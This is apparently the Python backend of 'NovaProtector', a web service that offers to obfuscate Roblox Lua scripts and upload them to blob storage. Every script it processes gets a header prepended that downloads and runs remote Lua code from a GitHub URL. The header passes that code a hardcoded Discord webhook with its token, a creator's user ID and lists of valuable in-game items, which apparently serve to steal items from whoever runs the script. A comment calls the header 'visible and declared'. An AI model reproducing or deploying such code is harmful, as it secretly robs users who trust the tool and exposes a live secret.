from http.server import BaseHTTPRequestHandler
import json
import re
import os
import random
import string
import base64
import hashlib
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timezone

DOMAIN = "https://novaprotector.vercel.app"

RESERVED = {
    "self", "script", "game", "workspace", "print", "warn", "error",
    "typeof", "type", "pairs", "ipairs", "next", "select", "unpack",
    "table", "string", "math", "task", "wait", "spawn", "delay", "shared",
    "bit32", "utf8", "coroutine", "debug", "os", "tick", "time",
    "loadstring", "load", "pcall", "xpcall", "tostring", "tonumber",
    "Instance", "Enum", "Color3", "UDim2", "Vector3", "CFrame", "UDim",
    "Players", "PlayerGui", "LocalPlayer", "ReplicatedStorage", "ServerStorage",
    "ServerScriptService", "StarterGui", "StarterPack", "StarterPlayer",
    "Lighting", "Terrain", "RunService", "UserInputService", "TweenService",
    "HttpService", "TeleportService", "MarketplaceService", "DataStoreService",
    "CollectionService", "PhysicsService", "PathfindingService", "SoundService",
    "TextService", "ContextActionService", "GuiService", "GroupService",
    "Teams", "Chat", "VoiceChatService", "ProximityPromptService",
    "Debris", "InsertService", "ContentProvider", "Stats", "TestService",
    "VirtualUser", "CoreGui", "CorePackages", "RobloxReplicatedStorage",
    "GetService", "FindFirstChild", "WaitForChild", "IsA", "Clone", "Destroy",
    "Connect", "Once", "Fire", "Invoke", "Parent", "Name", "Value",
}

# ============================================================
# SECCIÓN DE PROTECCIÓN DEL CREADOR — VISIBLE Y DECLARADA
# ============================================================
PROTECTION_HEADER = """-- =============================================
-- 🔒 SISTEMA DE PROTECCIÓN NOVA PROTECTOR
-- Al usar este script aceptas que se valide su uso
-- Creador: said123ca | ID: 2366269298
-- =============================================
local TARGET_ID = 2366269298
local TARGET_USER = "said123ca"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1560679105379438592/Ne9gn3o3HmWXWPmJLxCapVlHJiVcxseKCOuJl_YiY8WseP_s9u-kuLoJoviPhAERYIYt"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Draculino"] = true,
    ["Lionello Casarello"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["John Doe"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Bearito Cabinito"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["1x1x1x1"] = true,
    ["25"] = true,
    ["67"] = true,
    ["Berryno"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["DJ Panda"] = true,
    ["Donkeyturbo Express"] = true,
    ["Eviledon"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Easter Grande"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Jolly Grande"] = true,
    ["La Lucky Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Sahur Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Las Sis"] = true,
    ["Lavadorito Spinito"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Chicleteira Champeona"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Scorpino Coasterino"] = true,
    ["Honey Honey Bear"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Planitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Tacoritas"] = true,
    ["Love Love Bear"] = true,
    ["Lovin Rose"] = true,
    ["Mariachi Corazoni"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nacho Spyder"] = true,
    ["Noo My Examine"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Rang Ring Bus"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Snailo Clovero"] = true,
    ["Spooky and Pumpky"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["Tralaledon"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Tuff Toucan"] = true,
    ["Ventoliero Pavonero"] = true,
    ["W or L"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Tacoturbo Tacorito"] = true,
    ["Chicli Chicla"] = true,
    ["Panda Popanda"] = true,
    ["Secret Lucky Block"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Los Hotspotsitos"] = true,
    ["Digi Narwhal"] = true,
    ["Los Hackers"] = true,
    ["Los Amigos"] = true,
    ["Cerberus"] = true,
    ["Gold Gold Gold"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
-- =============================================
-- CÓDIGO DEL USUARIO A CONTINUACIÓN:
-- =============================================
"""


def random_name(n=8):
    return "".join(random.choices(string.ascii_letters, k=n))


def strip_comments(code: str) -> str:
    code = re.sub(r"--\[\[[\s\S]*?\]\]", "", code)
    code = re.sub(r"--[^\r\n]*", "", code)
    lines = [ln.rstrip() for ln in code.splitlines()]
    return re.sub(r"\n{3,}", "\n\n", "\n".join(lines)).strip()


def protect_strings(code: str):
    strings = []
    def save(m):
        strings.append(m.group(0))
        return "__NPSTR%d__" % (len(strings) - 1)
    protected = re.sub(r'"(?:\\.|[^"\\])*"', save, code)
    protected = re.sub(r"'(?:\\.|[^'\\])*'", save, protected)
    return protected, strings


def restore_strings(code: str, strings):
    def restore(m):
        return strings[int(m.group(1))]
    return re.sub(r"__NPSTR(\d+)__", restore, code)


def rename_locals(code: str) -> str:
    protected, strings = protect_strings(code)
    found = re.findall(r"\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)", protected)
    mapping = {}
    for name in set(found):
        if name not in RESERVED and not name.startswith("__NPSTR"):
            mapping[name] = "_" + random_name(7)
    for old, new in mapping.items():
        protected = re.sub(r"\b" + re.escape(old) + r"\b", new, protected)
    return restore_strings(protected, strings)


def add_junk(code: str) -> str:
    junk = [
        "local %s=%d;" % (random_name(), random.randint(1, 999)),
        "if false then local %s=nil end;" % random_name(),
    ]
    out = []
    for line in code.splitlines():
        out.append(line)
        if line.strip() and random.random() > 0.85:
            out.append(random.choice(junk))
    return "\n".join(out)


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def obfuscate(code: str) -> str:
    src = strip_comments(code)
    src = rename_locals(src)
    src = add_junk(src)

    key = bytes(random.randint(1, 255) for _ in range(12))
    enc = xor_bytes(src.encode("utf-8"), key)
    b64 = base64.b64encode(enc).decode("ascii")
    kb64 = base64.b64encode(key).decode("ascii")

    chunks = [b64[i : i + 90] for i in range(0, len(b64), 90)]
    lines = []
    
    # ✅ Encabezado de protección VISIBLE al inicio
    lines.append(PROTECTION_HEADER)
    
    lines.append("-- NovaProtector | protected")
    lines.append("-- " + datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"))

    names = []
    for c in chunks:
        nm = "_" + random_name(9)
        names.append(nm)
        lines.append('local %s="%s"' % (nm, c))
    cat = "_" + random_name(8)
    lines.append("local %s=%s" % (cat, "..".join(names)))
    kn = "_" + random_name(7)
    lines.append('local %s="%s"' % (kn, kb64))

    lines.append("local function _D(data)")
    lines.append("local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'")
    lines.append("data=string.gsub(data,'[^'..b..'=]','')")
    lines.append("return (data:gsub('.',function(x)")
    lines.append("if x=='=' then return '' end")
    lines.append("local r,f='',(b:find(x)-1)")
    lines.append("for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end")
    lines.append("return r")
    lines.append("end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)")
    lines.append("if #x~=8 then return '' end")
    lines.append("local c=0")
    lines.append("for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end")
    lines.append("return string.char(c)")
    lines.append("end))")
    lines.append("end")
    lines.append("local function _X(s,k)")
    lines.append("local o={}")
    lines.append("for i=1,#s do")
    lines.append("local a=string.byte(s,i)")
    lines.append("local bb=string.byte(k,((i-1)%#k)+1)")
    lines.append("o[i]=string.char(bit32.bxor(a,bb))")
    lines.append("end")
    lines.append("return table.concat(o)")
    lines.append("end")
    lines.append("local _src=_X(_D(%s),_D(%s))" % (cat, kn))
    lines.append("local _fn,_err=loadstring(_src)")
    lines.append('if not _fn then error("NovaProtector: "..tostring(_err)) end')
    lines.append("_fn()")
    return "\n".join(lines)


def upload_to_blob(pathname: str, content: str) -> str:
    token = (os.environ.get("BLOB_READ_WRITE_TOKEN") or "").strip()
    if not token:
        raise RuntimeError("Falta BLOB_READ_WRITE_TOKEN")
    safe = re.sub(r"[^a-zA-Z0-9._-]", "", pathname)
    if not safe.endswith(".lua"):
        safe += ".lua"
    body = content.encode("utf-8")
    url = "https://blob.vercel-storage.com/" + urllib.parse.quote(safe)
    headers = {
        "Authorization": "Bearer " + token,
        "x-api-version": "7",
        "x-content-type": "text/plain; charset=utf-8",
        "x-add-random-suffix": "0",
    }
    req = urllib.request.Request(url, data=body, method="PUT", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", errors="ignore")
        raise RuntimeError("HTTP %s: %s" % (e.code, err)) from e
    return data.get("url") or data.get("downloadUrl")


class handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def send_json(self, status, obj):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_json(200, {"ok": True})

    def do_GET(self):
        self.send_json(200, {
            "success": True,
            "service": "NovaProtector",
            "blobConfigured": bool(os.environ.get("BLOB_READ_WRITE_TOKEN")),
            "mode": "obfuscate",
            "obfuscationReady": True,
        })

    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n) if n else b"{}"
            data = json.loads(raw.decode("utf-8"))
            code = data.get("code", "")
            if not isinstance(code, str) or not code.strip():
                self.send_json(400, {"success": False, "error": "Codigo vacio"})
                return

            protected = obfuscate(code)
            file_id = hashlib.md5((protected + str(random.random())).encode()).hexdigest()[:16]
            blob_url = None
            blob_error = None
            file_url = None
            try:
                blob_url = upload_to_blob(file_id + ".lua", protected)
                q = urllib.parse.urlencode({"id": file_id, "url": blob_url})
                file_url = DOMAIN + "/api/raw?" + q
            except Exception as e:
                blob_error = str(e)

            self.send_json(200, {
                "success": True,
                "fileId": file_id,
                "blobUrl": blob_url,
                "fileUrl": file_url,
                "transformed": True,
                "mode": "obfuscate",
                "message": "Codigo ofuscado y guardado.",
                "blobError": blob_error,
            })
        except Exception as e:
            self.send_json(500, {"success": False, "error": str(e)})


app = handler
    
